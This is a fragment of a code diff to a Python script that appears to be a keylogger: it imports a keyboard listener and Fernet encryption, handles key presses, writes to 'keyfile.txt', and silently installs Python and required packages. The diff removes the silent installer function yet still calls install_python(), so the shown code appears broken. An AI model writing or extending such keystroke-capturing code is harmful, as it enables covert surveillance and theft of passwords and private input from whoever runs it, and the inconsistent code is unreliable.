@@ -25,15 +25,10 @@ def ensure_libraries_installed():
         install_package('cryptography')
 
 
+
 from pynput import keyboard
 from cryptography.fernet import Fernet
 
-def install_python():
-    # Check if Python is installed already
-    if not os.path.exists("C:\\Python311\\python.exe"):
-        python_installer = "python-3.11.9-amd64.exe"
-        # Run Python installer silently
-        subprocess.run([python_installer, '/quiet', '/norestart'])
 
 def get_encryption_key():
     try:
@@ -74,7 +69,7 @@ def keyPressed(key):
 
 if __name__ == "__main__":
     install_python()
-
+    ensure_libraries_installed()
     # Ensure the keyfile.txt is empty at the start
     open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file
 
